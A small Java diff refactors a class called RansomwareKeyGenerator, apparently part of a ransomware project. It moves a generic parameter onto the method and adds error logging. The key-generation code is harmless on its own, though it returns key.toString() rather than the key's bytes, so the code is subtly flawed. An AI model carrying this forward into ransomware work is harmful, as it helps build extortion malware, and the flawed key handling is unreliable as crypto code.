@@ -7,8 +7,8 @@ import javax.crypto.KeyGenerator;
 
 import server.exceptions.AlgorithmNotFoundException;
 
-public class RansomwareKeyGenerator<T> {
-	public T generateKey(String chosenAlgorithm) throws AlgorithmNotFoundException {
+public class RansomwareKeyGenerator {
+	public <T> T generateKey(String chosenAlgorithm) throws AlgorithmNotFoundException {
 
 		// Creating a KeyGenerator object
 		KeyGenerator keyGen = null;
@@ -25,11 +25,11 @@ public class RansomwareKeyGenerator<T> {
 			Key key = keyGen.generateKey();
 			return (T) key.toString();
 		} catch (NoSuchAlgorithmException e) {
-		
+			e.printStackTrace();
 		}
 
-			throw new AlgorithmNotFoundException();
-		
+		throw new AlgorithmNotFoundException();
+
 	}
 
 }
